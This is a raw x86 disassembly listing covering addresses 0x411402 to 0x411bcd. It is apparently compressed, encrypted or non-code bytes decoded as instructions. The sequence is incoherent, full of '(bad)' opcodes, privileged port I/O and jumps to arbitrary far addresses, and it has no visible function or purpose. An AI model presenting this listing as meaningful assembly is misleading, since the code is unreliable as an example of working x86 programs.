  411402:	xor    BYTE PTR [ebx],dl
  411404:	sti    
  411405:	xchg   edx,eax
  411406:	loop   0x4113f5
  411408:	cmp    BYTE PTR ds:0xf5c3849b,0xac
  41140f:	adc    al,0x71
  411411:	icebp  
  411412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411413:	(bad)  
  411414:	pop    ss
  411415:	dec    edx
  411416:	addr16 inc edx
  411418:	mov    BYTE PTR [edx-0x141b7b34],ch
  41141e:	test   al,0x94
  411420:	jg     0x4113ec
  411422:	jmp    0xe852ce1a
  411427:	shl    BYTE PTR [ebx-0x7ec44280],1
  41142d:	lock add ebx,DWORD PTR ss:[ebp-0x3c3cbb23]
  411435:	cld    
  411436:	mov    edi,0xf4157e86
  41143b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41143c:	and    DWORD PTR [esi],edx
  41143e:	in     eax,dx
  41143f:	cmp    eax,0xc16cc9bd
  411444:	clc    
  411445:	pop    esi
  411446:	(bad)  
  411447:	iret   
  411448:	mov    al,0xa8
  41144a:	dec    edi
  41144b:	clc    
  41144c:	mov    edi,0x8dedd563
  411451:	or     DWORD PTR [edi],esi
  411453:	mov    ah,0x1f
  411455:	test   BYTE PTR [eax+0x2bf175c],0xd6
  41145c:	push   ebx
  41145d:	xor    BYTE PTR [ecx-0x15],0x9
  411461:	rol    BYTE PTR [edx+0x58d2e4e5],0x72
  411468:	mov    eax,0x6283e13b
  41146d:	xor    ah,BYTE PTR [ebx]
  41146f:	inc    esp
  411470:	daa    
  411471:	daa    
  411472:	mov    DWORD PTR [edx],ecx
  411474:	xchg   edx,eax
  411475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411476:	cmp    dh,BYTE PTR [esi]
  411478:	mov    esp,0xae87f5ce
  41147d:	mov    eax,ds:0x52883eed
  411482:	jno    0x411499
  411484:	fcmove st,st(4)
  411486:	jno    0x4114f6
  411488:	(bad)  
  411489:	cmp    BYTE PTR [edx+0x3e90cdd7],bl
  41148f:	pop    edi
  411490:	sar    DWORD PTR [eax],0x26
  411493:	retf   
  411494:	jnp    0x41143a
  411496:	popf   
  411497:	adc    al,BYTE PTR [ebx-0x6855f368]
  41149d:	pop    ss
  41149e:	not    cl
  4114a0:	and    BYTE PTR [ecx],dh
  4114a2:	lock sbb bl,0x8b
  4114a6:	ret    0x5cc1
  4114a9:	inc    edi
  4114aa:	pop    edi
  4114ab:	addr16 push ecx
  4114ad:	aas    
  4114ae:	das    
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	ja     0x4114e1
  4114b3:	adc    BYTE PTR [edx],dl
  4114b5:	leave  
  4114b6:	sti    
  4114b7:	xor    DWORD PTR [ecx+0x34],ecx
  4114ba:	sbb    al,0xc7
  4114bc:	ins    BYTE PTR es:[edi],dx
  4114bd:	ins    BYTE PTR es:[edi],dx
  4114be:	add    edx,DWORD PTR ds:0xfcb4415e
  4114c4:	xor    ah,BYTE PTR [eax+0x16]
  4114c7:	or     eax,0xc18a8923
  4114cc:	shl    bh,0xd9
  4114cf:	xchg   edx,eax
  4114d0:	xor    edx,0xbb93e6e1
  4114d6:	addr16 addr16 mov ds:0x6337,eax
  4114db:	in     eax,0x50
  4114dd:	retf   0xb42d
  4114e0:	xor    BYTE PTR [esi+esi*2+0x681115e2],0xfa
  4114e8:	data16 sbb bh,0xeb
  4114ec:	pop    esi
  4114ed:	mov    cl,BYTE PTR [ecx-0x46306467]
  4114f3:	xchg   ebx,eax
  4114f4:	jns    0x41149d
  4114f6:	mov    eax,ds:0x41444265
  4114fb:	repz mov ah,0xf5
  4114fe:	jl     0x4114d1
  411500:	mov    ds:0xc1bd5134,eax
  411505:	jnp    0x411506
  411507:	add    eax,0xe0c48386
  41150c:	outs   dx,DWORD PTR ds:[esi]
  41150d:	sub    al,BYTE PTR [eax+eax*4+0x27]
  411511:	mov    ah,0xb9
  411513:	adc    al,0x14
  411515:	push   0xa0165e3f
  41151a:	outs   dx,BYTE PTR ds:[esi]
  41151b:	mov    ecx,edx
  41151d:	dec    ecx
  41151e:	pop    ebp
  41151f:	pop    esp
  411520:	test   BYTE PTR [edi],dl
  411522:	sbb    ah,BYTE PTR [ebx]
  411524:	sub    DWORD PTR [eax],edx
  411526:	inc    edx
  411527:	test   ch,cl
  411529:	xchg   esi,eax
  41152a:	add    edx,esi
  41152c:	and    DWORD PTR [esi-0x20],eax
  41152f:	xor    al,0x7b
  411531:	sub    eax,0x25a7abd0
  411536:	call   0x6849:0x9dd280e0
  41153d:	sar    DWORD PTR [edx-0x15],0x8a
  411541:	cld    
  411542:	sbb    edi,DWORD PTR [ecx]
  411544:	pop    esi
  411545:	sbb    DWORD PTR [ebx+0x5ef56a3e],esp
  41154b:	sbb    eax,0x3ad627ea
  411550:	mov    bh,0x6d
  411552:	jno    0x4115c3
  411554:	rcr    DWORD PTR [edx],1
  411556:	mov    ch,0x28
  411558:	shl    BYTE PTR [eax],cl
  41155a:	leave  
  41155b:	push   esi
  41155c:	or     esp,DWORD PTR [edx-0x3d]
  41155f:	rcl    BYTE PTR [edx-0x7d],1
  411562:	sbb    BYTE PTR [esi+eiz*1],al
  411565:	dec    esp
  411566:	enter  0xc041,0x53
  41156a:	and    DWORD PTR [ebx+0x1e048f92],esp
  411570:	cmp    bh,bl
  411572:	dec    esi
  411573:	(bad)  
  411574:	sbb    eax,0x6120e5e8
  411579:	xchg   edx,eax
  41157a:	xchg   ecx,eax
  41157b:	sbb    DWORD PTR [esi+0x53c7bf78],ebp
  411581:	ds sbb al,bl
  411584:	in     al,dx
  411585:	sbb    al,0x17
  411587:	sbb    al,0x58
  411589:	or     ebp,ebx
  41158b:	xor    BYTE PTR [esi],0x3c
  41158e:	mov    esp,0xdb463670
  411593:	dec    ebx
  411594:	or     al,0x9d
  411596:	push   es
  411597:	mov    dh,0x65
  411599:	xor    BYTE PTR [ebx-0x2d],ch
  41159c:	loopne 0x411541
  41159e:	clc    
  41159f:	ins    BYTE PTR es:[edi],dx
  4115a0:	rcl    BYTE PTR [edx-0x4f],0xc1
  4115a4:	lock add DWORD PTR [esi+eiz*2+0x696aecb0],ebp
  4115ac:	xor    ecx,DWORD PTR [edx-0x4093fbb]
  4115b2:	mov    esi,0x763fcf
  4115b7:	call   0x106083e8
  4115bc:	dec    ecx
  4115bd:	mov    edi,0x79b2ac31
  4115c2:	xchg   edi,eax
  4115c3:	sti    
  4115c4:	inc    edx
  4115c5:	stos   DWORD PTR es:[edi],eax
  4115c6:	adc    eax,0x11097aa9
  4115cb:	sbb    BYTE PTR ds:0x48448da8,bh
  4115d1:	fmulp  st(1),st
  4115d3:	xchg   ecx,eax
  4115d4:	or     al,0x4e
  4115d6:	aaa    
  4115d7:	sahf   
  4115d8:	xchg   esp,eax
  4115d9:	cmp    eax,0x58a3c97f
  4115de:	xchg   edx,eax
  4115df:	pushf  
  4115e0:	pop    esp
  4115e1:	or     BYTE PTR cs:[edi+0x213da0df],cl
  4115e8:	shl    DWORD PTR [edi+eiz*4],cl
  4115eb:	aas    
  4115ec:	jne    0x4115d9
  4115ee:	fisubr DWORD PTR [ebp+0x42]
  4115f1:	jp     0x411624
  4115f3:	inc    edx
  4115f4:	aad    0x80
  4115f6:	pop    ebp
  4115f7:	inc    ecx
  4115f8:	push   0x6ce29328
  4115fd:	in     eax,dx
  4115fe:	mov    ch,0xe7
  411600:	mov    bh,0xd7
  411602:	popf   
  411603:	dec    esp
  411604:	retf   
  411605:	mov    eax,0x67e93f1f
  41160a:	sub    al,ah
  41160c:	data16 sbb bh,BYTE PTR [edx-0x7bfd691]
  411613:	fist   DWORD PTR [edx]
  411615:	jbe    0x4115e8
  411617:	imul   ecx,DWORD PTR [ebx-0x217a586d],0x4b
  41161e:	xchg   esi,eax
  41161f:	popf   
  411620:	hlt    
  411621:	stc    
  411622:	xchg   BYTE PTR [edx+ecx*2-0x227fdcc],ah
  411629:	retf   
  41162a:	in     al,dx
  41162b:	jle    0x4116ab
  41162d:	sub    ecx,esp
  41162f:	jo     0x411604
  411631:	inc    edx
  411632:	adc    bl,BYTE PTR ds:0x96f911ef
  411638:	sub    edx,ebp
  41163a:	nop
  41163b:	shl    ah,0x55
  41163e:	fwait
  41163f:	imul   esi,DWORD PTR [esi],0x7c155b31
  411645:	mov    ah,0x2a
  411647:	ret    
  411648:	pop    esp
  411649:	sub    ch,cl
  41164b:	mov    ds:0xf6c055a5,eax
  411650:	xchg   edi,eax
  411651:	(bad)
  411654:	dec    esp
  411655:	mov    ebp,0x22f2b851
  41165a:	xchg   edi,eax
  41165b:	jecxz  0x4115e0
  41165d:	inc    ebx
  41165e:	int3   
  41165f:	sub    esp,DWORD PTR [edx-0x6d8aa68c]
  411665:	push   ebx
  411666:	in     al,0x2a
  411668:	fidivr DWORD PTR [edi-0x32]
  41166b:	ret    0xf1db
  41166e:	add    DWORD PTR [edi-0x3e69b508],edi
  411674:	ins    BYTE PTR es:[edi],dx
  411675:	js     0x4116e3
  411677:	push   0xffffffc9
  411679:	fcom   QWORD PTR ds:0x898d9a3
  41167f:	outs   dx,DWORD PTR ds:[esi]
  411680:	or     al,0x96
  411682:	adc    eax,0x20ff9d63
  411687:	in     al,dx
  411688:	retf   0xb120
  41168b:	(bad)  
  41168c:	jmp    0xce32dd46
  411691:	dec    ebp
  411692:	mov    ch,0x6c
  411694:	aad    0x6c
  411696:	in     eax,dx
  411697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411698:	in     al,dx
  411699:	jmp    edi
  41169b:	jmp    0x5e4b:0x9ebc3ff5
  4116a2:	mov    ds:0x229ddc69,eax
  4116a7:	ins    BYTE PTR es:[edi],dx
  4116a8:	xor    al,BYTE PTR [edx-0x66]
  4116ab:	adc    bh,BYTE PTR [ebp+0x516fbba6]
  4116b1:	jg     0x41168d
  4116b3:	push   0x48
  4116b5:	add    eax,0xbec67631
  4116ba:	pop    ecx
  4116bb:	out    dx,al
  4116bc:	jno    0x4116e3
  4116be:	aad    0x8e
  4116c0:	sub    bh,BYTE PTR [edx+0x104701b4]
  4116c6:	in     al,dx
  4116c7:	fild   WORD PTR [edx-0x394b4710]
  4116cd:	dec    ecx
  4116ce:	aam    0xa4
  4116d0:	fld    QWORD PTR gs:[ebp+0x6056991d]
  4116d7:	out    0x28,al
  4116d9:	jmp    0x4116ac
  4116db:	loopne 0x4116d9
  4116dd:	pop    ds
  4116de:	cs inc esi
  4116e0:	shl    BYTE PTR [ecx],cl
  4116e2:	ja     0x411762
  4116e4:	pop    edx
  4116e5:	adc    eax,0xacdb2743
  4116ea:	xchg   edi,eax
  4116eb:	clc    
  4116ec:	pop    edi
  4116ed:	aam    0x85
  4116ef:	inc    esp
  4116f0:	iret   
  4116f1:	mov    esi,0x5b9e1286
  4116f6:	fld    st(2)
  4116f8:	jl     0x41176d
  4116fa:	shl    BYTE PTR [edi-0x114644c9],0x2d
  411701:	mul    DWORD PTR [edx]
  411703:	jp     0x4116a7
  411705:	xor    BYTE PTR [eax],0x27
  411708:	psubb  mm2,QWORD PTR [esi]
  41170b:	jo     0x4116a8
  41170d:	enter  0x241e,0x83
  411711:	add    ah,BYTE PTR [ebp+0x1415a825]
  411717:	mov    ebp,DWORD PTR [eax+0x26]
  41171a:	mov    esp,0x7b88ac28
  41171f:	jae    0x411774
  411721:	fmulp  st(3),st
  411723:	jae    0x411779
  411725:	pop    edi
  411726:	stc    
  411727:	call   0xba6a987a
  41172c:	dec    edx
  41172d:	or     ah,BYTE PTR [edx]
  41172f:	daa    
  411730:	(bad)  
  411731:	pop    ebp
  411732:	xor    eax,0x502aed22
  411737:	lods   al,BYTE PTR ds:[esi]
  411738:	sub    ch,BYTE PTR [ebp+0x1e]
  41173b:	cs push eax
  41173d:	cmc    
  41173e:	or     al,0x83
  411740:	ja     0x411727
  411742:	je     0x411710
  411744:	jnp    0x41176d
  411746:	lods   eax,DWORD PTR ds:[esi]
  411747:	sub    al,0x37
  411749:	mov    DWORD PTR [edi],ebx
  41174b:	ins    DWORD PTR es:[edi],dx
  41174c:	xlat   BYTE PTR ds:[ebx]
  41174d:	mov    ecx,0x282d4a8e
  411752:	dec    ecx
  411753:	leave  
  411754:	je     0x411714
  411756:	daa    
  411757:	push   0x67f2e92
  41175c:	lods   al,BYTE PTR ds:[esi]
  41175d:	jb     0x4117c7
  41175f:	add    edi,eax
  411761:	ret    0x69a9
  411764:	add    eax,DWORD PTR [esi+0x40]
  411767:	pop    esp
  411768:	adc    eax,0xd49ef568
  41176d:	pop    ecx
  41176e:	add    ch,BYTE PTR [edi]
  411770:	push   ds
  411771:	xor    eax,0xa575fa1a
  411776:	loope  0x411798
  411778:	in     eax,0xb4
  41177a:	pop    ds
  41177b:	jecxz  0x4117d3
  41177d:	mov    ds:0x6ddf3842,eax
  411782:	dec    ecx
  411783:	mov    bh,bh
  411785:	pop    DWORD PTR [esi-0x51447fd5]
  41178b:	adc    cl,ah
  41178d:	shl    BYTE PTR [esi+eiz*2-0x2282365c],cl
  411794:	xor    DWORD PTR [ebx-0x177b670a],ecx
  41179a:	push   es
  41179b:	fs jg  0x411807
  41179e:	and    BYTE PTR [eax+0x19],ah
  4117a1:	jle    0x4117f4
  4117a3:	dec    edi
  4117a4:	push   esp
  4117a5:	sti    
  4117a6:	fldenv [esi+eiz*4-0x48]
  4117aa:	ret    
  4117ab:	test   eax,0xd26384bf
  4117b0:	mov    dl,0xb
  4117b2:	data16 or dl,bh
  4117b5:	dec    ebp
  4117b6:	fwait
  4117b7:	sbb    eax,0xe084287b
  4117bc:	aam    0x30
  4117be:	lods   al,BYTE PTR ds:[esi]
  4117bf:	pop    ecx
  4117c0:	push   ss
  4117c1:	mov    eax,0x8a105625
  4117c6:	cmc    
  4117c7:	jmp    0x35af:0x965caaef
  4117ce:	icebp  
  4117cf:	inc    ebp
  4117d0:	sbb    BYTE PTR [edi+0x5e3561ff],bh
  4117d6:	mov    eax,DWORD PTR [esi+0xb]
  4117d9:	inc    ecx
  4117da:	and    al,0xa4
  4117dc:	scas   eax,DWORD PTR es:[edi]
  4117dd:	cmp    eax,0x7b333785
  4117e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117e3:	icebp  
  4117e4:	push   edi
  4117e5:	mov    bh,0x89
  4117e7:	xchg   ebx,eax
  4117e8:	ins    BYTE PTR es:[edi],dx
  4117e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117eb:	or     ebx,edx
  4117ed:	repz pop esp
  4117ef:	and    BYTE PTR [esi],bl
  4117f1:	push   esi
  4117f2:	imul   ebx,DWORD PTR [esi],0x33556e58
  4117f8:	out    0xad,al
  4117fa:	push   cs
  4117fb:	push   0xfc2df8a4
  411800:	cs out dx,eax
  411802:	fs push edx
  411804:	loope  0x41179b
  411806:	imul   esi,DWORD PTR [eax-0x30a98cf4],0xffffff81
  41180d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41180e:	xor    bl,BYTE PTR [esi+0x4c]
  411811:	ins    DWORD PTR es:[edi],dx
  411812:	xchg   edi,eax
  411813:	hlt    
  411814:	dec    edi
  411815:	gs inc edx
  411817:	mov    ss,WORD PTR [ebx+0x8]
  41181a:	stc    
  41181b:	lods   al,BYTE PTR ds:[esi]
  41181c:	push   cs
  41181d:	enter  0x8f65,0x1c
  411821:	out    dx,eax
  411822:	dec    ebx
  411823:	aas    
  411824:	or     ebx,ecx
  411826:	jae    0x411887
  411828:	sbb    DWORD PTR [edx+eiz*2-0x70],0xfa5b7717
  411830:	aad    0x76
  411832:	mov    ds:0x1c1cadb0,eax
  411837:	xlat   BYTE PTR ds:[ebx]
  411838:	aad    0x23
  41183a:	loop   0x411829
  41183c:	inc    eax
  41183d:	and    eax,0x779ed614
  411842:	int    0x8a
  411844:	enter  0x67dc,0x7
  411848:	dec    esp
  411849:	sar    bl,cl
  41184b:	jnp    0x411841
  41184d:	les    ebx,FWORD PTR [esi-0x21556b2]
  411853:	loope  0x4118bd
  411855:	push   ebx
  411856:	shr    DWORD PTR [eax],0x25
  411859:	cmp    DWORD PTR ds:0x7b049e89,esi
  41185f:	mov    fs,WORD PTR [ecx+0x528ef1cf]
  411865:	sbb    BYTE PTR [esi+0x480c9db9],0x63
  41186c:	mov    DWORD PTR [edx],0xf1b806c1
  411872:	sti    
  411873:	xor    ah,BYTE PTR [ecx+0x775525]
  411879:	inc    esi
  41187a:	popf   
  41187b:	mov    ah,0xab
  41187d:	dec    edx
  41187e:	ds mov eax,0x96bb2baa
  411884:	and    al,0x49
  411886:	inc    DWORD PTR [edx+0x5a55e9bd]
  41188c:	lea    ecx,[esi+0x11ee5882]
  411892:	push   edi
  411893:	mov    ch,0x94
  411895:	shl    BYTE PTR [eax+0x17],1
  411898:	es ins BYTE PTR es:[edi],dx
  41189a:	lock ret 0x4bdc
  41189e:	mov    al,BYTE PTR [ebx+0x289ac70]
  4118a4:	std    
  4118a5:	dec    edx
  4118a6:	dec    ecx
  4118a7:	xchg   edi,eax
  4118a8:	rcl    BYTE PTR [eax-0x79],1
  4118ab:	pop    ds
  4118ac:	lods   eax,DWORD PTR ds:[esi]
  4118ad:	scas   eax,DWORD PTR es:[edi]
  4118ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118af:	daa    
  4118b0:	mov    ah,0x12
  4118b2:	pop    ss
  4118b3:	push   0xca933e86
  4118b8:	mov    ch,0x62
  4118ba:	jmp    0xf707:0x5984686e
  4118c1:	cvtdq2ps xmm7,XMMWORD PTR [ebx]
  4118c4:	ficom  DWORD PTR [edx-0x6e]
  4118c7:	push   0xe964b073
  4118cc:	stos   BYTE PTR es:[edi],al
  4118cd:	sbb    dl,BYTE PTR [edx]
  4118cf:	jle    0x411885
  4118d1:	jbe    0x4118aa
  4118d3:	jecxz  0x411930
  4118d5:	dec    ecx
  4118d6:	dec    ecx
  4118d7:	lods   eax,DWORD PTR ds:[esi]
  4118d8:	dec    ebx
  4118d9:	int    0x5
  4118db:	stc    
  4118dc:	cmp    al,0xde
  4118de:	cmp    DWORD PTR [esi+0x2f253ab9],esp
  4118e4:	pop    ebp
  4118e5:	mov    dh,0x56
  4118e7:	sub    esp,edi
  4118e9:	leave  
  4118ea:	dec    esi
  4118eb:	loope  0x4118bb
  4118ed:	daa    
  4118ee:	pop    ebx
  4118ef:	mov    WORD PTR [edi],fs
  4118f1:	enter  0xa3b,0xe7
  4118f5:	push   ebx
  4118f6:	or     eax,0x541b784c
  4118fb:	fidivr DWORD PTR [esp+edi*2-0x6c]
  4118ff:	jl     0x4118ca
  411901:	jge    0x41193a
  411903:	jl     0x411910
  411905:	dec    DWORD PTR [ecx]
  411907:	clc    
  411908:	add    bh,BYTE PTR [ebp-0x2d]
  41190b:	stos   DWORD PTR es:[edi],eax
  41190c:	addr16 inc ecx
  41190e:	or     cl,BYTE PTR [ecx+0x5488e2bf]
  411914:	push   edi
  411915:	mov    eax,ds:0xab95bdff
  41191a:	adc    ebp,ebp
  41191c:	ret    0xcf3b
  41191f:	pop    esp
  411920:	or     bl,ch
  411922:	iret   
  411923:	lds    esp,FWORD PTR [edx+eax*1+0x14]
  411927:	push   0x5c
  411929:	mov    eax,0x1f520d2c
  41192e:	sbb    bh,cl
  411930:	cmp    al,0x38
  411932:	pop    esi
  411933:	xor    DWORD PTR [edi],0x2c
  411936:	mov    eax,0x5e3e453c
  41193b:	jo     0x41193a
  41193d:	jp     0x4118fc
  41193f:	les    ecx,FWORD PTR [ebx+0x3d]
  411942:	(bad)  
  411943:	imul   esp,DWORD PTR [edx-0x6d],0xb7ab569e
  41194a:	mov    BYTE PTR [eax+0x66],bl
  41194d:	adc    al,0x9e
  41194f:	ss push ebp
  411951:	mov    ebx,0xf52c342d
  411956:	mov    ecx,0xf96adf6c
  41195b:	sahf   
  41195c:	xchg   ebx,eax
  41195d:	mov    esi,0x39692c05
  411962:	ja     0x4118ea
  411964:	xor    edi,DWORD PTR [esi+edi*8]
  411967:	ins    BYTE PTR es:[edi],dx
  411968:	mov    bh,BYTE PTR [edi]
  41196a:	and    esp,DWORD PTR [esi+0x504cb01c]
  411970:	aas    
  411971:	rcr    esp,cl
  411973:	aad    0x94
  411975:	jmp    0xfcccead6
  41197a:	enter  0x7302,0x37
  41197e:	adc    BYTE PTR [ebx-0x7a],ah
  411981:	adc    dl,BYTE PTR [ebx+0x46878a82]
  411987:	jge    0x411932
  411989:	mov    ch,0xc9
  41198b:	sub    ebx,edi
  41198d:	or     dh,BYTE PTR [ebx+0x5d]
  411990:	cmp    bl,BYTE PTR ds:0xdc05fe2b
  411996:	mov    ecx,0x1b67ea7
  41199b:	inc    eax
  41199c:	mov    dh,BYTE PTR [ecx-0x43]
  41199f:	iret   
  4119a0:	adc    eax,0x21915306
  4119a5:	mov    ecx,0xe2c48534
  4119aa:	into   
  4119ab:	jns    0x411a26
  4119ad:	in     eax,dx
  4119ae:	jb     0x411a1a
  4119b0:	enter  0xc436,0x80
  4119b4:	add    eax,ecx
  4119b6:	cmp    esp,DWORD PTR [edx+0x604bc2dd]
  4119bc:	dec    ecx
  4119bd:	xchg   ecx,eax
  4119be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119bf:	pop    esi
  4119c0:	cmp    DWORD PTR [eax],edx
  4119c2:	je     0x411975
  4119c4:	or     al,0x4f
  4119c6:	xchg   esi,eax
  4119c7:	mov    cl,0x34
  4119c9:	dec    ecx
  4119ca:	or     DWORD PTR [ecx-0x23],esp
  4119cd:	xchg   ah,ah
  4119cf:	xlat   BYTE PTR ds:[ebx]
  4119d0:	dec    edx
  4119d1:	pusha  
  4119d2:	mov    ebx,0x4f5ec3e3
  4119d7:	nop
  4119d8:	les    eax,FWORD PTR [edx]
  4119da:	ret    
  4119db:	mov    WORD PTR [edx],ss
  4119dd:	pop    esp
  4119de:	mov    dh,BYTE PTR [esi]
  4119e0:	jne    0x411a1f
  4119e2:	ror    DWORD PTR [edx+0x17f381a7],1
  4119e8:	mov    dh,0x29
  4119ea:	push   ebp
  4119ec:	fbstp  TBYTE PTR [edi+0x5b]
  4119ef:	ins    DWORD PTR es:[edi],dx
  4119f0:	add    DWORD PTR [esi],edi
  4119f2:	and    BYTE PTR [esi],ah
  4119f4:	mov    bh,BYTE PTR [edx+0x36]
  4119f7:	test   BYTE PTR [ebp-0x4b],dh
  4119fa:	pushf  
  4119fb:	(bad)  
  4119fc:	retf   0xf5c
  4119ff:	inc    DWORD PTR [ebx+0x4eac644c]
  411a05:	sub    al,0x11
  411a07:	inc    eax
  411a08:	sbb    eax,0x6d82b9a2
  411a0d:	jo     0x411a6c
  411a0f:	mov    ebp,0x75438f1c
  411a14:	idiv   bl
  411a16:	hlt    
  411a17:	fidiv  DWORD PTR [esi]
  411a19:	enter  0xcd1f,0x20
  411a1d:	aas    
  411a1e:	jp     0x411a9f
  411a20:	sbb    esi,DWORD PTR [edi-0x38]
  411a23:	push   edx
  411a24:	fs call 0x1ecb92ad
  411a2a:	rol    BYTE PTR [esi+ebp*4],cl
  411a2d:	mov    dh,0x78
  411a2f:	scas   eax,DWORD PTR es:[edi]
  411a30:	dec    esp
  411a31:	mov    dl,0xcc
  411a33:	vpaddq ymm3,ymm4,YMMWORD PTR [ecx+0xc70f299]
  411a3b:	xchg   edi,eax
  411a3d:	and    BYTE PTR [edi+0x3964ce79],bl
  411a43:	fdiv   DWORD PTR [esi]
  411a45:	mov    ds:0xb8a3fc9a,al
  411a4a:	je     0x411a1e
  411a4c:	cdq    
  411a4d:	lds    ebx,FWORD PTR [ecx-0x1a]
  411a50:	jmp    0x20ed:0xd7c7b06d
  411a57:	movq   QWORD PTR [edx+0x36],mm6
  411a5b:	xchg   edx,eax
  411a5c:	lds    esp,FWORD PTR [edx]
  411a5e:	xor    BYTE PTR [eax],dh
  411a60:	jl     0x411a67
  411a62:	cs ins DWORD PTR es:[edi],dx
  411a64:	or     eax,0x765d7354
  411a69:	(bad)  
  411a6a:	and    esi,ebp
  411a6c:	jg     0x411ab7
  411a6e:	sub    eax,0x81314695
  411a73:	out    dx,al
  411a74:	test   al,0x2f
  411a76:	lods   al,BYTE PTR ds:[esi]
  411a77:	mov    bl,0xf
  411a79:	inc    edx
  411a7a:	je     0x411a2d
  411a7c:	call   0x45ade604
  411a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a82:	adc    ecx,ebx
  411a84:	push   edi
  411a85:	jae    0x411a1f
  411a87:	xchg   esp,eax
  411a88:	adc    edi,DWORD PTR [esi+0x60]
  411a8b:	inc    ebx
  411a8c:	std    
  411a8d:	data16 jne 0x411aca
  411a90:	repnz cld 
  411a92:	jbe    0x411a56
  411a94:	sub    eax,0xb3201a18
  411a99:	loop   0x411ab9
  411a9b:	das    
  411a9c:	push   ss
  411a9d:	push   ecx
  411a9e:	into   
  411a9f:	fwait
  411aa0:	add    cl,BYTE PTR [ecx+0x2d]
  411aa3:	adc    BYTE PTR [edx+0xcd2109f],bh
  411aa9:	es repz aas 
  411aac:	add    DWORD PTR [ebx+esi*8],ecx
  411aaf:	(bad)  
  411ab0:	jmp    0x5e557989
  411ab5:	call   DWORD PTR [eax+0x36db19a]
  411abb:	or     eax,0x402e8cc6
  411ac0:	jne    0x411a6a
  411ac2:	dec    ecx
  411ac3:	cmp    esp,edi
  411ac5:	inc    ebx
  411ac6:	scas   al,BYTE PTR es:[edi]
  411ac7:	mov    ebp,0xa9b07f9
  411acc:	stos   DWORD PTR es:[edi],eax
  411acd:	and    eax,ebx
  411acf:	push   ds
  411ad0:	jne    0x411ac8
  411ad2:	lea    esi,[ecx-0x3da5ce91]
  411ad8:	sbb    eax,0xcaf701a
  411add:	test   al,0x57
  411adf:	sub    BYTE PTR [esi+0x22],dl
  411ae2:	and    ebx,DWORD PTR [edx-0x3c]
  411ae5:	push   ecx
  411ae6:	xor    edx,DWORD PTR [edx+edi*4+0x77f72d7f]
  411aed:	pop    esp
  411aee:	add    BYTE PTR [ebx+ecx*8],cl
  411af1:	mov    ch,BYTE PTR [ecx]
  411af3:	out    dx,al
  411af4:	mov    WORD PTR [edx+eax*2+0x6e],?
  411af8:	sbb    eax,0x9da86c86
  411afd:	lods   eax,DWORD PTR ds:[esi]
  411afe:	daa    
  411aff:	imul   esi,edi,0x867dd709
  411b05:	jnp    0x411ad7
  411b07:	adc    eax,DWORD PTR [edx]
  411b09:	push   ebx
  411b0a:	xor    al,0xbb
  411b0c:	mov    ebp,0xd458cef7
  411b11:	add    eax,DWORD PTR [esi-0x26f8a66c]
  411b17:	adc    DWORD PTR [esi],esi
  411b19:	inc    ebx
  411b1a:	add    al,0xf6
  411b1c:	dec    edi
  411b1d:	cmp    bl,BYTE PTR [ebx-0x4e87b216]
  411b23:	push   cs
  411b24:	pop    ecx
  411b25:	push   edi
  411b26:	jne    0x411b87
  411b28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b29:	ffree  st(3)
  411b2b:	imul   ebx,DWORD PTR [esp+edx*4-0x43b06800],0x795572e9
  411b36:	push   es
  411b37:	jmp    0x411aed
  411b39:	shr    BYTE PTR [edx-0x23],cl
  411b3c:	mov    ah,0x5b
  411b3e:	lods   eax,DWORD PTR ds:[esi]
  411b3f:	mov    ebp,0xf5fea024
  411b44:	add    al,BYTE PTR [edi-0x799ff6f6]
  411b4a:	mov    ebp,DWORD PTR [edx]
  411b4c:	(bad)  
  411b4d:	es mov ah,0xa3
  411b50:	clc    
  411b51:	repz xor DWORD PTR [edi+0x47],0x14
  411b56:	mov    bh,0x3b
  411b58:	retf   
  411b59:	mov    ds:0x813f6028,eax
  411b5e:	aaa    
  411b5f:	retf   
  411b60:	inc    ebx
  411b61:	shl    ecx,1
  411b63:	popa   
  411b64:	rol    al,1
  411b66:	and    DWORD PTR [ebx],ecx
  411b68:	fnstsw WORD PTR [edi+0x185c7a40]
  411b6e:	shr    BYTE PTR [ebp-0x2b],1
  411b71:	pop    eax
  411b72:	fistp  QWORD PTR [ecx-0x4]
  411b75:	dec    esi
  411b76:	fld    TBYTE PTR [ebx]
  411b78:	mov    DWORD PTR [ecx-0x2bbfdd96],ecx
  411b7e:	jne    0x411b16
  411b80:	push   esi
  411b81:	pop    es
  411b82:	fcom   QWORD PTR [esi]
  411b84:	push   es
  411b85:	pop    esp
  411b86:	mov    bh,0xa4
  411b88:	inc    ecx
  411b89:	push   esp
  411b8a:	rcr    BYTE PTR [edx+0xdf07695],1
  411b90:	or     DWORD PTR [eax],esp
  411b92:	or     ebx,DWORD PTR [eax-0x74cc1fa8]
  411b98:	push   ecx
  411b99:	cmp    eax,0x7e82a645
  411b9e:	cmp    cl,BYTE PTR [eax+0x56]
  411ba1:	sbb    esp,DWORD PTR [edi+edx*2]
  411ba4:	shl    dh,1
  411ba6:	in     eax,0x3
  411ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ba9:	out    dx,al
  411baa:	xor    ebp,DWORD PTR [eax+ecx*4+0x263cbdc1]
  411bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bb2:	jmp    0x411b8c
  411bb4:	sbb    eax,edi
  411bb6:	scas   al,BYTE PTR es:[edi]
  411bb7:	ret    
  411bb8:	js     0x411bab
  411bba:	dec    ebx
  411bbb:	jno    0x411be1
  411bbd:	fwait
  411bbe:	push   esp
  411bbf:	(bad)  
  411bc0:	nop
  411bc1:	test   edi,esi
  411bc3:	aas    
  411bc4:	imul   ecx,DWORD PTR ds:0xac594d82,0x58
  411bcb:	and    al,0x17
  411bcd:	arpl   WORD PTR [bx+di],si
